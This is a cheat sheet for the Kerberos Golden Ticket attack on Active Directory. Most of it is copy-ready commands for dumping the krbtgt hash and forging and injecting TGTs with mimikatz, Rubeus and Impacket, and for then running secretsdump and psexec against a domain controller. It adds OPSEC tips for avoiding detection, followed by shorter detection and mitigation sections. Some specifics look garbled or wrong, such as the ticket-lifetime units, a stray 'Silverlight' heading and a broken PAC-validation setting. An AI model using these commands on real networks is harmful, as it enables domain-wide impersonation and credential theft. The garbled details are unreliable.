# Golden Ticket Attack

## Overview

A Golden Ticket is a forged TGT (Ticket-Granting Ticket), encrypted with the `krbtgt` account's password hash. With a Golden Ticket, an attacker can impersonate **any user** (including Domain Admins) to **any service** in the domain. The ticket is forged entirely offline — no contact with the DC is required once the krbtgt hash is obtained.

## What Makes Golden Tickets Possible

The KDC trusts any TGT that decrypts successfully with `krbtgt`'s key. Since the attacker forges the TGT with the real krbtgt key, the KDC treats it as legitimate. The TGT contains a PAC (Privilege Attribute Certificate) with user/group membership data, all encrypted inside the ticket.

### Information Required

| Data | Description | How to Obtain |
|------|-------------|---------------|
| krbtgt hash (RC4 or AES) | Password hash of the krbtgt account | `lsadump::dcsync` or `lsadump::lsa` |
| Domain SID | Security identifier of the domain | `whoami /user` or AD enumeration |
| Target username | User to impersonate | Usually `Administrator` or any DA |
| Domain FQDN | Fully qualified domain name | Enumeration |

### Obtaining krbtgt Hash

```mimikatz
# On Domain Controller (need DA privileges)
privilege::debug
lsadump::lsa /patch

# DCSync (from any machine with DA creds)
lsadump::dcsync /domain:domain.local /user:krbtgt

# Extract from NTDS.dit
lsadump::lsa /inject
```

### Obtaining Domain SID

```cmd
# Command prompt
whoami /user

# PowerShell
(Get-ADDomain).DomainSID.Value

# PowerView
Get-DomainSID
```

## Forging the Golden Ticket

### Mimikatz

```mimikatz
# RC4 (NTLM hash) - most common
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx-xxxx-xxxx /krbtgt:NT_HASH /ptt

# AES256 (more stealthy - matches modern KDC)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx-xxxx-xxxx /aes256:AES256_HASH /ptt

# AES128
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx-xxxx-xxxx /aes128:AES128_HASH /ptt

# Custom groups (e.g., adding high-privilege SIDs)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /krbtgt:HASH /groups:512,513,518,519,520 /ptt

# Specify domain and enterprise admin group RIDs
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /krbtgt:HASH /id:500 /groups:512,513,518,519,520,1200 /ptt
```

**Parameters explained:**
- `/user` - Username to impersonate (doesn't need to exist)
- `/domain` - Domain FQDN
- `/sid` - Domain SID (without the RID)
- `/krbtgt` - NT hash of krbtgt account
- `/aes256` / `/aes128` - AES key instead of RC4
- `/ptt` - Pass-the-ticket (inject into current session)
- `/id` - User RID (default is 500 for Administrator)
- `/groups` - Group RIDs to include in PAC (default is Domain Admins)

### Rubeus (Windows)

```powershell
# Forge golden ticket with AES256
Rubeus.exe golden /aes256:AES256_HASH /user:Administrator /id:500 /domain:domain.local /sid:S-1-5-21-xxxx /ptt

# Forge with RC4
Rubeus.exe golden /rc4:NT_HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /ptt

# Forge and inject with specific LUID
Rubeus.exe golden /aes256:AES256_HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /luid:0x123abc /ptt

# Forge and write to ticket file (for later use)
Rubeus.exe golden /aes256:AES256_HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-xxxx /ticket:ticket.kirbi
```

### ticketer.py (Impacket - Linux)

```bash
# Create golden ticket with RC4
ticketer.py -nthash NT_HASH -domain-sid S-1-5-21-xxxx -domain domain.local Administrator

# Create golden ticket with AES
ticketer.py -aesKey AES256_KEY -domain-sid S-1-5-21-xxxx -domain domain.local Administrator

# Create with custom groups
ticketer.py -nthash HASH -domain-sid S-X -domain domain.local -groups 512,513,518,519,520 Administrator

# Create and set as environment variable
export KRB5CCNAME=/path/to/Administrator.ccache
ticketer.py -nthash HASH -domain-sid S-X -domain domain.local Administrator
```

### goldenPac.py (Impacket - Linux)

```bash
# One-liner: create golden + PSExec
goldenPac.py -target 192.168.1.10 domain.local/Administrator -dc-ip 192.168.1.10

# Requires:
# - Domain Admin credentials (to get krbtgt hash)
# - goldenPac internally uses DCSync + ticketer + psexec
```

## Using the Golden Ticket

### With Mimikatz (already injected via /ptt)

```mimikatz
# Verify injected tickets
kerberos::list

# The golden ticket allows accessing any resource
# Can use any tool (mimikatz, PSExec, winrm, etc.)
misc::cmd
```

### With Impacket after ticketer.py

```bash
# The ticketer.py creates a .ccache file
# Use it with any Impacket tool
export KRB5CCNAME=/path/to/Administrator.ccache

# Access the DC
secretsdump.py -k -no-pass domain.local/Administrator@dc.domain.local

# PSExec
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local

# WMI exec
wmiquery.py -k -no-pass domain.local/Administrator@dc.domain.local

# SMB exec
smbexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### With Rubeus (injected ticket)

```powershell
# After /ptt injection
dir \\dc.domain.local\c$
Invoke-Command -ComputerName dc.domain.local -ScriptBlock { whoami }
```

## Ticket Lifetime

By default, Mimikatz creates tickets with a 10-year lifetime. Rubeus defaults to the standard Kerberos ticket lifetime. You can customize:

```mimikatz
# Set specific lifetime
kerberos::golden /user:Admin /domain:dom /sid:S-X /krbtgt:HASH /ptt /startoffset:-1 /endin:28800
```

- `/startoffset` - Hours from now when ticket becomes valid (negative = past)
- `/endin` - Hours until ticket expires (default 10 years in mimikatz)

### OPSEC on Lifetime

- A 10-year ticket triggers suspicion (most tickets last 10 hours)
- Set `/endin:8` to 10 hours to appear normal
- Set `/startoffset:-1` to make it valid from the past (avoids time skew issues)

## OPSEC Considerations

| Aspect | Consideration |
|--------|---------------|
| **krbtgt hash exposure** | Getting krbtgt hash via DCSync generates event 4662 (DS-Replication-Get-Changes-All) |
| **No DC contact needed** | Golden ticket is forged offline; no Kerberos events on DC during use |
| **Ticket lifetime** | Default 10-year tickets are suspicious; set realistic lifetime |
| **Encryption type** | RC4 golden tickets in an AES-only environment stand out |
| **User ID** | Using RID 500 (Administrator) is suspicious if the real admin isn't active |
| **Domain SID** | Must match the domain; cannot forge cross-domain without trust knowledge |
| **Forged PAC** | Domain Controllers with PAC validation (KDC PAC Validation) can detect forged PACs |
| **Renewal** | Golden tickets cannot be renewed (no renewal key); must be re-forged if expired |

### What Event ID is NOT Generated

Golden ticket abuse does **NOT** generate:
- Event 4768 (TGT request) - because no AS-REQ is sent
- Event 4624 (logon) - depends on service access method
- Event 4648 (explicit credentials) - not generated

When the forged TGT is used to request a TGS, event 4769 **will** be generated (the DC sees a valid TGT and issues a service ticket).

## Detection

### Event 4769 - Service Ticket Requested

The only 4769 indicator is if the golden ticket's encryption type differs from normal domain behavior. The DC treats the forged TGT as valid (since it decrypts correctly).

### KDC PAC Validation (Mitigation)

- **Feature**: Domain controllers with PAC validation enabled check the PAC signature
  - `KDC `ValidationOptions` = `1` (Validate PAC)
- **Detection**: If enabled, validates the PAC extended errors (KRB_AP_ERR_MODIFIED) will occur
- **Limitation**: Not enabled by default; requires setting `KDC `validationOptions`

### Event IDs for Pre-Kerberos Activity

The golden ticket creation requires DA access or DCSync:

| Event ID | Description | When |
|----------|-------------|------|
| 4662 | DS-Replication-Get-Changes-All | DCSync to get krbtgt hash |
| 4670 | Permissions on an object changed | Replication rights modification |
| 5136 | Directory Service Change | Any AD attribute modification |

### Silverlight / Honey Tokens

- Deploy fake "honeytoken" accounts in AD that are never legitimately used
- Monitor for any authentication attempts using those accounts
- Golden ticket forges TGT with any username (including honeytokens)

### Detection Logic

```kusto
// KQL - Look for TGS requests from users that shouldn't have tickets
EventID: 4769
| where AccountName == "honeytoken_user" or AccountName == "monitor_account"
| where ServiceName != "krbtgt"
```

```powershell
# Check for tickets with abnormal lifetime
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} |
    ForEach-Object { $_.Properties }
```

## Mitigations

1. **Protect the krbtgt account** - It is the most sensitive account in the domain
2. **Rotate krbtgt password** periodically (especially after a compromise):
   ```powershell
   # Reset krbtgt password twice
   Reset-ADAccountPassword -Identity krbtgt
   # Wait for replication, then reset again
   Reset-ADAccountPassword -Identity krbtgt
   ```
3. **Enable KDC PAC Validation** on all DCs
4. **Use Protected Users group** - Accounts in this group cannot be delegated or use NTLM
5. **Enable Extended Protection for Authentication**
6. **Monitor DCSync** (event 4662 with Replication-Get-Changes-All)
7. **Deploy honey tokens** in AD to detect forged TGT usage
8. **Enable Windows Defender Credential Guard** (on supported systems)

## References

- Benjamin Delpy (mimikatz) - Original Golden Ticket implementation
- MS-KILE: Kerberos Protocol Extensions
- [MS-PAC]: Privilege Attribute Certificate Structure
